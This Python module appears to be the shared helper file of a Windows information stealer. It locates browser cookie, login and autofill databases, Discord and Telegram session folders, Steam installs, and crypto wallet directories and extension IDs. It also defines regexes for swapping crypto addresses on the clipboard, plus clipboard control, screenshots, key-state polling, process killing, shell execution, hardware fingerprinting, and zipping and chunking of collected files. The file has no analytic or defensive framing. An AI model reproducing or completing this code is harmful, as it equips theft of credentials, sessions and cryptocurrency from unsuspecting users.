import os
import sys
import json
import time
import base64
import random
import string
import shutil
import tempfile
import sqlite3
import hashlib
import ctypes
import subprocess
import threading
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

# Import Windows-specific modules
try:
    import win32crypt
    import win32api
    import win32con
    import win32process
    import win32security
    import win32event
    import win32gui
    import win32clipboard
    import win32file
    import win32pipe
    import winreg
except ImportError:
    pass

# Import crypto modules
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError:
    pass

# Import system monitoring
try:
    import psutil
except ImportError:
    pass

# Module version
__version__ = "1.0.0"

# Common utility functions for modules
def get_appdata():
    return os.getenv("APPDATA")

def get_localappdata():
    return os.getenv("LOCALAPPDATA")

def get_temp_dir():
    return tempfile.gettempdir()

def get_documents_dir():
    return os.path.join(os.path.expanduser("~"), "Documents")

def get_desktop_dir():
    return os.path.join(os.path.expanduser("~"), "Desktop")

def get_downloads_dir():
    return os.path.join(os.path.expanduser("~"), "Downloads")

def safe_copy(src, dst):
    try:
        shutil.copy2(src, dst)
        return True
    except:
        return False

def safe_remove(path):
    try:
        if os.path.exists(path):
            if os.path.isfile(path):
                os.remove(path)
            else:
                shutil.rmtree(path)
            return True
    except:
        pass
    return False

def create_temp_copy(src, prefix="temp_", suffix=".db"):
    try:
        temp_dir = tempfile.mkdtemp()
        temp_file = os.path.join(temp_dir, prefix + str(random.randint(1000, 9999)) + suffix)
        if safe_copy(src, temp_file):
            return temp_file, temp_dir
    except:
        pass
    return None, None

def encrypt_data(data, key):
    try:
        if isinstance(data, str):
            data = data.encode()
        cipher = Fernet(key)
        return cipher.encrypt(data)
    except:
        return None

def decrypt_data(encrypted_data, key):
    try:
        cipher = Fernet(key)
        return cipher.decrypt(encrypted_data).decode()
    except:
        return None

def get_browser_paths():
    browser_paths = []
    localappdata = get_localappdata()
    appdata = get_appdata()
    
    browsers = [
        {
            "name": "Chrome",
            "path": os.path.join(localappdata, "Google", "Chrome", "User Data"),
            "cookie_path": os.path.join("Default", "Network", "Cookies"),
            "login_path": os.path.join("Default", "Login Data"),
            "history_path": os.path.join("Default", "History"),
            "bookmarks_path": os.path.join("Default", "Bookmarks"),
            "autofill_path": os.path.join("Default", "Web Data")
        },
        {
            "name": "Brave",
            "path": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "cookie_path": os.path.join("Default", "Network", "Cookies"),
            "login_path": os.path.join("Default", "Login Data"),
            "history_path": os.path.join("Default", "History"),
            "bookmarks_path": os.path.join("Default", "Bookmarks"),
            "autofill_path": os.path.join("Default", "Web Data")
        },
        {
            "name": "Edge",
            "path": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
            "cookie_path": os.path.join("Default", "Network", "Cookies"),
            "login_path": os.path.join("Default", "Login Data"),
            "history_path": os.path.join("Default", "History"),
            "bookmarks_path": os.path.join("Default", "Bookmarks"),
            "autofill_path": os.path.join("Default", "Web Data")
        },
        {
            "name": "Opera",
            "path": os.path.join(appdata, "Opera Software", "Opera Stable"),
            "cookie_path": os.path.join("Default", "Network", "Cookies"),
            "login_path": os.path.join("Default", "Login Data"),
            "history_path": os.path.join("Default", "History"),
            "bookmarks_path": os.path.join("Default", "Bookmarks"),
            "autofill_path": os.path.join("Default", "Web Data")
        },
        {
            "name": "OperaGX",
            "path": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
            "cookie_path": os.path.join("Default", "Network", "Cookies"),
            "login_path": os.path.join("Default", "Login Data"),
            "history_path": os.path.join("Default", "History"),
            "bookmarks_path": os.path.join("Default", "Bookmarks"),
            "autofill_path": os.path.join("Default", "Web Data")
        },
        {
            "name": "Vivaldi",
            "path": os.path.join(localappdata, "Vivaldi", "User Data"),
            "cookie_path": os.path.join("Default", "Network", "Cookies"),
            "login_path": os.path.join("Default", "Login Data"),
            "history_path": os.path.join("Default", "History"),
            "bookmarks_path": os.path.join("Default", "Bookmarks"),
            "autofill_path": os.path.join("Default", "Web Data")
        },
        {
            "name": "Firefox",
            "path": os.path.join(appdata, "Mozilla", "Firefox", "Profiles"),
            "cookie_path": "cookies.sqlite",
            "login_path": "logins.json",
            "history_path": "places.sqlite",
            "bookmarks_path": "places.sqlite",
            "autofill_path": "formhistory.sqlite"
        }
    ]
    
    for browser in browsers:
        if os.path.exists(browser["path"]):
            browser_paths.append(browser)
    
    return browser_paths

def get_discord_paths():
    paths = []
    appdata = get_appdata()
    localappdata = get_localappdata()
    
    discord_paths = [
        os.path.join(appdata, "discord"),
        os.path.join(appdata, "discordcanary"),
        os.path.join(appdata, "discordptb"),
        os.path.join(appdata, "discorddevelopment"),
        os.path.join(localappdata, "Discord"),
        os.path.join(localappdata, "DiscordCanary"),
        os.path.join(localappdata, "DiscordPTB"),
        os.path.join(localappdata, "DiscordDevelopment")
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            paths.append(path)
    
    return paths

def get_wallet_paths():
    wallet_paths = {}
    appdata = get_appdata()
    localappdata = get_localappdata()
    roaming = os.getenv("APPDATA")
    
    wallets = {
        "metamask": [
            os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
            os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm"),
            os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
        ],
        "exodus": [
            os.path.join(appdata, "Exodus", "exodus.wallet"),
            os.path.join(appdata, "Exodus")
        ],
        "atomic": [
            os.path.join(appdata, "atomic", "Local Storage", "leveldb"),
            os.path.join(appdata, "Atomic")
        ],
        "electrum": [
            os.path.join(appdata, "Electrum", "wallets"),
            os.path.join(appdata, "Electrum")
        ],
        "bitcoin_core": [
            os.path.join(appdata, "Bitcoin", "wallets"),
            os.path.join(appdata, "Bitcoin")
        ],
        "coinbase": [
            os.path.join(localappdata, "Coinbase", "Coinbase.exe"),
            os.path.join(appdata, "Coinbase")
        ],
        "trust_wallet": [
            os.path.join(localappdata, "Trust Wallet"),
            os.path.join(appdata, "Trust Wallet")
        ],
        "phantom": [
            os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
            os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")
        ],
        "brave_wallet": [
            os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "odbfpeeihdkbihmopkbjmoonfanlbfcl")
        ],
        "ryo_wallet": [
            os.path.join(appdata, "ryo", "ryo.wallet")
        ],
        "monero": [
            os.path.join(appdata, "Monero", "wallets")
        ],
        "litecoin_core": [
            os.path.join(appdata, "Litecoin", "wallets")
        ],
        "dogecoin_core": [
            os.path.join(appdata, "Dogecoin", "wallets")
        ],
        "daedalus": [
            os.path.join(appdata, "Daedalus", "wallets")
        ],
        "wasabi": [
            os.path.join(appdata, "WalletWasabi", "Client", "Wallets")
        ]
    }
    
    for wallet_name, paths in wallets.items():
        for path in paths:
            if os.path.exists(path):
                if wallet_name not in wallet_paths:
                    wallet_paths[wallet_name] = []
                if path not in wallet_paths[wallet_name]:
                    wallet_paths[wallet_name].append(path)
    
    return wallet_paths

def get_steam_paths():
    paths = []
    
    # Check registry for Steam path
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        steam_path, _ = winreg.QueryValueEx(key, "SteamPath")
        winreg.CloseKey(key)
        if steam_path and os.path.exists(steam_path):
            paths.append(steam_path)
    except:
        pass
    
    # Check default locations
    default_paths = [
        os.path.join(os.getenv("ProgramFiles(x86)", ""), "Steam"),
        os.path.join(os.getenv("ProgramFiles", ""), "Steam"),
        os.path.join(os.getenv("LOCALAPPDATA", ""), "Steam")
    ]
    
    for path in default_paths:
        if os.path.exists(path):
            paths.append(path)
    
    return paths

def get_telegram_paths():
    paths = []
    appdata = get_appdata()
    localappdata = get_localappdata()
    
    telegram_paths = [
        os.path.join(appdata, "Telegram Desktop", "tdata"),
        os.path.join(appdata, "Telegram Desktop"),
        os.path.join(localappdata, "Telegram Desktop", "tdata"),
        os.path.join(localappdata, "Telegram Desktop")
    ]
    
    for path in telegram_paths:
        if os.path.exists(path):
            paths.append(path)
    
    return paths

def get_crypto_clipboard_patterns():
    patterns = {
        "bitcoin": r"[13][a-km-zA-HJ-NP-Z1-9]{25,34}",
        "ethereum": r"0x[a-fA-F0-9]{40}",
        "litecoin": r"[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}",
        "dogecoin": r"D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}",
        "monero": r"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}",
        "ripple": r"r[0-9a-zA-Z]{24,34}",
        "cardano": r"addr1[a-z0-9]{98}",
        "stellar": r"G[A-D][A-Z2-7]{54}",
        "tron": r"T[a-zA-Z0-9]{33}",
        "binance": r"bnb[a-zA-Z0-9]{39}",
        "solana": r"[1-9A-HJ-NP-Za-km-z]{32,44}"
    }
    return patterns

def format_file_size(size_bytes):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if size_bytes < 1024.0:
            return f"{size_bytes:.2f} {unit}"
        size_bytes /= 1024.0
    return f"{size_bytes:.2f} PB"

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def generate_random_name(prefix="file", extension=".txt"):
    return f"{prefix}_{random.randint(1000, 9999)}_{int(time.time())}{extension}"

def is_valid_file(path, max_size=5242880):
    try:
        if not os.path.exists(path):
            return False
        if not os.path.isfile(path):
            return False
        if os.path.getsize(path) > max_size:
            return False
        return True
    except:
        return False

def read_file_content(path, encoding='utf-8'):
    try:
        with open(path, 'r', encoding=encoding, errors='ignore') as f:
            return f.read()
    except:
        return None

def read_file_bytes(path):
    try:
        with open(path, 'rb') as f:
            return f.read()
    except:
        return None

def write_file(path, content, mode='w'):
    try:
        with open(path, mode) as f:
            f.write(content)
        return True
    except:
        return False

def get_system_drives():
    drives = []
    try:
        for drive in string.ascii_uppercase:
            if os.path.exists(f"{drive}:\\"):
                drives.append(f"{drive}:\\")
    except:
        pass
    return drives

def list_directory(path, recursive=False, depth=0, max_depth=3):
    files = []
    try:
        if depth > max_depth:
            return files
        
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isfile(item_path):
                files.append(item_path)
            elif os.path.isdir(item_path) and recursive:
                files.extend(list_directory(item_path, recursive, depth + 1, max_depth))
    except:
        pass
    return files

def search_files(directory, extensions, max_size=5242880):
    found_files = []
    try:
        for root, dirs, files in os.walk(directory):
            # Skip system directories
            dirs[:] = [d for d in dirs if d not in ['Windows', 'Program Files', 'Program Files (x86)', 'AppData', 'node_modules', '__pycache__']]
            
            for file in files:
                if any(file.lower().endswith(ext.lower()) for ext in extensions):
                    file_path = os.path.join(root, file)
                    if is_valid_file(file_path, max_size):
                        found_files.append(file_path)
    except:
        pass
    return found_files

def create_zip(files, output_path=None):
    try:
        import zipfile
        
        if output_path is None:
            output_path = os.path.join(get_temp_dir(), f"collected_{int(time.time())}.zip")
        
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
        
        return output_path
    except:
        return None

def split_data(data, chunk_size=8000):
    if isinstance(data, str):
        data = data.encode()
    
    chunks = []
    for i in range(0, len(data), chunk_size):
        chunks.append(data[i:i+chunk_size])
    return chunks

def join_data(chunks):
    if isinstance(chunks[0], str):
        return ''.join(chunks)
    return b''.join(chunks)

def get_clipboard_content():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()
            return data.decode('utf-8', errors='ignore')
        win32clipboard.CloseClipboard()
    except:
        pass
    return None

def set_clipboard_content(text):
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        return True
    except:
        return False

def get_screenshot():
    try:
        import mss
        import mss.tools
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            return mss.tools.to_png(screenshot.rgb, screenshot.size)
    except:
        pass
    return None

def get_key_state(key_code):
    try:
        return win32api.GetAsyncKeyState(key_code)
    except:
        return 0

def is_process_running(process_name):
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                return True
    except:
        pass
    return False

def kill_process(process_name):
    killed = []
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                proc.kill()
                killed.append(proc.info['pid'])
    except:
        pass
    return killed

def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
        return result.decode('utf-8', errors='ignore')
    except:
        return None

def get_env_var(name):
    return os.getenv(name)

def set_env_var(name, value):
    try:
        os.environ[name] = value
        return True
    except:
        return False

def get_username():
    return os.getenv("USERNAME") or os.getenv("USER") or "Unknown"

def get_hostname():
    return os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "Unknown"

def get_ip_address():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unknown"

def get_mac_address():
    try:
        import uuid
        return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
    except:
        return "Unknown"

def get_hwid():
    try:
        import wmi
        c = wmi.WMI()
        cpu_id = ""
        disk_serial = ""
        
        for cpu in c.Win32_Processor():
            cpu_id = cpu.ProcessorId.strip()
            break
        
        for disk in c.Win32_DiskDrive():
            disk_serial = disk.SerialNumber.strip()
            break
        
        hwid = hashlib.sha256(f"{cpu_id}{disk_serial}".encode()).hexdigest()
        return hwid
    except:
        return hashlib.sha256(get_mac_address().encode()).hexdigest()